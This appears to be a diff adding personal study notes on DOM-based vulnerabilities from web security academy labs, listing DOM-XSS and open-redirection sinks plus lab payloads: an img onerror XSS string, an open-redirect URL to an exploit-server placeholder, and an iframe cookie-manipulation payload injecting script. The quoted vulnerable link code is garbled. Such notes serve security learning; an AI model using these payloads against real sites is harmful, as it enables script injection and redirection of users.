@@ -212,3 +212,75 @@ Payload: element.innerHTML = comment.author
 
 <><img src=1 onerror=alert(1)>
 
+
+   						## Which sinks can lead to DOM-XSS vulnerabilities?
+# The following are some of the main sinks that can lead to DOM-XSS vulnerabilities: 
+
+							document.write()
+							document.writeln()
+							document.domain
+							element.innerHTML
+							element.outerHTML
+							element.insertAdjacentHTML
+							element.onevent
+							
+# The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities: 
+
+										add()
+										after()
+										append()
+										animate()
+										insertAfter()
+										insertBefore()
+										before()
+										html()
+										prepend()
+										replaceAll()
+										replaceWith()
+										wrap()
+										wrapInner()
+										wrapAll()
+										has()
+										constructor()
+										init()
+										index()
+										jQuery.parseHTML()
+										$.parseHTML()
+
+
+
+							## DOM-based open redirection
+# DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation.
+
+                      					## What is the impact of DOM-based open redirection?
+#  The blog post page contains the following link, which returns to the home page of the blog: 
+------> <a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+
+Payload: https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
+
+
+						## Which sinks can lead to DOM-based open-redirection vulnerabilities?
+#  The following are some of the main sinks can lead to DOM-based open-redirection vulnerabilities: 
+
+							location
+							location.host
+							location.hostname
+							location.href
+							location.pathname
+							location.search
+							location.protocol
+							location.assign()
+							location.replace()
+							open()
+							element.srcdoc
+							XMLHttpRequest.open()
+							XMLHttpRequest.send()
+							jQuery.ajax()
+							$.ajax()
+
+
+						## DOM-based cookie manipulation
+#  DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie. 
+
+Payload: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
+						
